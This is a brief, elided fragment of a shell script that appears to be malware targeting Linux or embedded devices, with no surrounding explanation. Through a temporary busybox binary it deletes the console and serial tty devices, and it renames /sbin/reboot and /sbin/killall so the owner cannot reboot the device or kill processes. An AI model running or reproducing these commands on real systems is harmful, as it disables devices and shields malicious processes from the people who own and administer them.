...
if [ $FILECOUNT -lt "5" ]; then
    ...
    ${TMP_BUSYBOX} rm /dev/tty0
    ${TMP_BUSYBOX} rm /dev/ttyS0
    ${TMP_BUSYBOX} rm /dev/ttyS1
    ${TMP_BUSYBOX} rm /dev/ttyS2
    ${TMP_BUSYBOX} rm /dev/ttyS3
...
if [ -e /sbin/reboot ]; then mv /sbin/reboot /sbin/reboot.bak; fi
if [ -e /sbin/killall ]; then mv /sbin/killall /sbin/killall.bak; fi
